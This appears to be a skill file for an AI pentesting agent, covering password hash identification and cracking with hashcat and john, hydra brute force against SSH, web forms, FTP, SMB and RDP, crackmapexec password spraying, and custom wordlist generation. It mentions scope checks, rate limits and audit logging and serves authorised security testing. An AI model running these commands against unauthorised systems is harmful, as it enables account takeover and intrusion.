---
name: credential-attack
description: >
  Password cracking, credential brute force, hash analysis, and authentication
  testing for penetration testing engagements. Use this skill whenever the user
  mentions password cracking, hash cracking, brute force attack, credential
  spraying, password spray, dictionary attack, hashcat, john the ripper, hydra,
  medusa, credential stuffing, NTLM hash, NTHash, NetNTLMv2, Kerberos ticket
  cracking, AS-REP roasting, Kerberoasting, hash identification, rainbow tables,
  wordlist generation, custom wordlists, CeWL, crunch, cupp, password policy
  analysis, or any request to crack, guess, or test credentials.
  Also trigger for: "crack these hashes", "brute force this login", "test
  default credentials", "generate a wordlist", "what hash type is this",
  "password audit", or any credential-related testing activity.
  Expert tools: hashcat (GPU), john (CPU), hydra (online brute force),
  crackmapexec (network cred testing), medusa (parallel brute force).
compatibility:
  tools: [bash, python]
  mcps: [desktop-commander, hexstrike]
  skills: [post-exploit, vuln-analysis, scope-guard]
---

# Credential Attack Skill

## Overview

Handles all credential-related testing: hash identification, offline cracking
(hashcat/john), online brute force (hydra/medusa), credential spraying, wordlist
generation, and password policy analysis. All online attacks require scope-guard
validation and rate-limit awareness.

## Expert Tool Selection Matrix

| Task | Best Tool | Why |
|------|-----------|-----|
| GPU hash cracking | **hashcat** | Fastest, supports 300+ hash types |
| CPU hash cracking | **john** | Better rules engine, more flexible |
| Online brute force (HTTP/SSH/FTP) | **hydra** | Widest protocol support |
| Network credential spraying | **crackmapexec** | SMB/WinRM/LDAP/SSH multi-proto |
| Parallel online brute force | **medusa** | Stable threading, modular |
| Hash identification | **hashid** / **haiti** | Auto-detect hash types |
| Wordlist generation (target-specific) | **CeWL** | Scrapes target site for words |
| Wordlist generation (personal) | **cupp** | Generates from personal info |
| Wordlist mutations | **hashcat rules** / **john rules** | Best-in-class mangling |

## Core Instructions

### Step 1 — Hash Identification
```bash
# Identify hash type
hashid '{hash_value}'
# OR
haiti '{hash_value}'

# Common hash formats:
# MD5:          32 hex chars           → hashcat -m 0
# SHA1:         40 hex chars           → hashcat -m 100
# SHA256:       64 hex chars           → hashcat -m 1400
# NTLM:         32 hex chars (Windows) → hashcat -m 1000
# NetNTLMv2:    user::domain:...      → hashcat -m 5600
# bcrypt:       $2b$...$...           → hashcat -m 3200
# Kerberos TGS: $krb5tgs$23$*...     → hashcat -m 13100
# AS-REP:       $krb5asrep$23$...     → hashcat -m 18200
```

### Step 2 — Offline Cracking (hashcat — GPU preferred)
```bash
# Dictionary attack
hashcat -m {mode} {hash_file} /usr/share/wordlists/rockyou.txt -o cracked.txt

# Dictionary + rules (best balance of speed and coverage)
hashcat -m {mode} {hash_file} /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -o cracked.txt

# Mask attack (brute force with pattern)
# ?l=lower ?u=upper ?d=digit ?s=special ?a=all
hashcat -m {mode} {hash_file} -a 3 '?u?l?l?l?l?l?d?d' -o cracked.txt

# Combinator attack (word1+word2)
hashcat -m {mode} {hash_file} -a 1 wordlist1.txt wordlist2.txt
```

### Step 2b — Offline Cracking (john — CPU, better rules)
```bash
# Auto-detect and crack
john --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}

# With rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 {hash_file}

# Show cracked
john --show {hash_file}
```

### Step 3 — Online Brute Force (hydra — REQUIRES scope-guard)
```bash
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://{target} -t 4 -w 30

# HTTP POST form
hydra -L users.txt -P passwords.txt {target} http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect" -t 4

# FTP
hydra -L users.txt -P passwords.txt ftp://{target}

# SMB
hydra -L users.txt -P passwords.txt smb://{target}

# RDP
hydra -L users.txt -P passwords.txt rdp://{target} -t 1
```

⚠️ **Rate limiting**: Always use `-t 4` or lower to avoid lockouts.
⚠️ **Account lockout**: Check password policy FIRST. If lockout after N attempts,
use credential spraying (1 password × many users) instead.

### Step 4 — Credential Spraying (crackmapexec)
```bash
# SMB password spray (1 pass, many users)
crackmapexec smb {target_range} -u users.txt -p 'Summer2026!' --no-bruteforce

# Check for password reuse across hosts
crackmapexec smb {target_range} -u admin -p cracked_pass --shares

# WinRM spray
crackmapexec winrm {target_range} -u users.txt -p 'Password1!'
```

### Step 5 — Wordlist Generation
```bash
# Target-specific wordlist from website
cewl {target_url} -d 3 -m 5 -w /tmp/pentest/{target}/custom_wordlist.txt

# Personal info wordlist (interactive)
cupp -i  # Prompts for name, DOB, pet names, etc.

# Combine and deduplicate
sort -u rockyou.txt custom_wordlist.txt cupp_output.txt > combined.txt

# Hashcat rules for mutations
# best64.rule — best coverage/speed ratio
# rockyou-30000.rule — exhaustive but slow
# OneRuleToRuleThemAll.rule — community favorite
```

## Output Format

```json
{
  "engagement_id": "ENG-2026-001",
  "credential_attack": {
    "hashes_received": 47,
    "hashes_cracked": 31,
    "crack_rate": "65.9%",
    "method": "hashcat dictionary+rules",
    "time_taken": "2h 15m",
    "cracked_credentials": [
      {"user": "admin", "hash_type": "NTLM", "password": "Summer2026!", "complexity": "weak"},
      {"user": "svc_backup", "hash_type": "NTLM", "password": "Backup123", "complexity": "weak"}
    ],
    "password_policy_findings": [
      "No minimum length enforced",
      "Common patterns: Season+Year (43%), Company+digits (22%)",
      "3 accounts using default credentials"
    ]
  }
}
```

## Output Checklist

- [ ] Hash type identified before cracking attempt
- [ ] Scope-guard validated for all online attacks
- [ ] Rate limits respected (check lockout policy first)
- [ ] Cracked credentials stored securely (not in plaintext logs)
- [ ] Password policy analysis included in findings
- [ ] All attempts logged to audit trail
